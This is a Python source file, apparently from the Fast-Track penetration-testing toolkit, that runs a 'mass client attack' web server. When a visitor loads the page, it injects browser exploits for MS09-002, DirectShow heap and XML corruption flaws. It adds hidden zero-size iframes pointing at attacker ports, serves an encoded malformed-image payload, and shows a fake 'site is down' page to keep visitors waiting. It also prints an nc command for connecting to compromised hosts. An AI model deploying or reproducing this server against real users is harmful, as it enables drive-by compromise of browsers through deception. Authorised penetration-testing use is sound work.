#!/usr/bin/env python
# Import modules needed here..all standard Python modules

from BaseHTTPServer import HTTPServer
from BaseHTTPServer import BaseHTTPRequestHandler
import sys
import os
import binascii

try:
    import psyco
    psyco.full()
except ImportError:
    pass

try:
    ipaddr = sys.argv[1]
except IndexError:
    ipaddr = raw_input("\n\nEnter the IP Address of your interface you want to listen on: ")

definepath = os.getcwd()


class myRequestHandler(BaseHTTPRequestHandler):
    try:
        def do_GET(self):
            # Always Accept GET
            self.printCustomHTTPResponse(200)
            # Site root: Main Menu

            if self.path == "/ohn0es.jpg":
                unhex = binascii.unhexlify("000300001120340000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff0c0c0c0c00")
                self.wfile.write(unhex)

            if self.path == "/":
                target = self.client_address[0]
                self.wfile.write("""<html><head>""")
                fileopen = file("%s/bin/ftsrc/clientattack/exploits/list" % (definepath), "r").readlines()
                counter = 8000
                fileopen2 = file("%s/bin/ftsrc/clientattack/exploits/xmlbo" % (definepath), "r").readlines()
                for line in fileopen2:
                    self.wfile.write(line)
                for line in fileopen:
                    line = line.rstrip()
                    self.wfile.write("""<iframe src ="http://%s:%s/" width="0" height="0" scrolling="no"></iframe>""" % (ipaddr, counter))
                    counter = counter + 1    
                fileopen2 = file("%s/bin/ftsrc/clientattack/exploits/ms09002" % (definepath), "r").readlines()
                for line in fileopen2:
                    self.wfile.write(line)
                for line in fileopen:
                    line = line.rstrip()
                    self.wfile.write("""<iframe src ="http://%s:%s/" width="0" height="0" scrolling="no"></iframe>""" % (ipaddr, counter))
                    counter = counter + 1
                fileopen2 = file("%s/bin/ftsrc/clientattack/exploits/directshowheap" % (definepath), "r").readlines()
                for line in fileopen2:
                    self.wfile.write(line)
                for line in fileopen:
                    line = line.rstrip()
                    self.wfile.write("""<iframe src ="http://%s:%s/" width="0" height="0" scrolling="no"></iframe>""" % (ipaddr, counter))
                    counter = counter + 1
                self.wfile.write("""<title>Site is currently down...</title></head><body>""")
                self.wfile.write("""<left><body bgcolor="Black"><font color="White"><p>Sorry, the page did not load correctly, please wait while your browser refreshes and the site should appear in a moment..</p>Sorry for any disruptions this may have caused..<br>""")
                print "Attempt a manual connect to IP Address: %s for the XML Corruption Exploit on port 5500, i.e. nc %s 5500" % (target, target)
        # Print standard browser headers

        def printBrowserHeaders(self):
            self.wfile.write("<p>Headers: <br>")
            header_keys = self.headers.dict.keys()
            for key in header_keys:
                self.wfile.write("<b>" + key + "</b>: ")
                self.wfile.write(self.headers.dict[key] + "<br>")

        # Print custom HTTP Response
        def printCustomHTTPResponse(self, respcode):
            self.send_response(respcode)
            self.send_header("Content-type", "text/html")
            self.send_header("Server", "myRequestHandler")
            self.end_headers()

        # In case of exceptions, pass them
    except Exception:
        pass


httpd = HTTPServer((ipaddr, 80), myRequestHandler)
print "\n****************************************\nFast-Track Mass Client Attack Web Server\nWritten by: David Kennedy (ReL1K)\n****************************************\n"
print "Starting HTTP Server on %s port 80\n" % (ipaddr)
print "*** Have someone connect to you on %s port 80 ***\n" % (ipaddr)
print "Type <control>-c to exit.."

try:
    httpd.handle_request()
    httpd.serve_forever() 
except KeyboardInterrupt:
    print "\n\nExiting Fast-Track Metasploit Mass Client Attack...\n\n"
    raise KeyboardInterrupt
    #sys.exit()

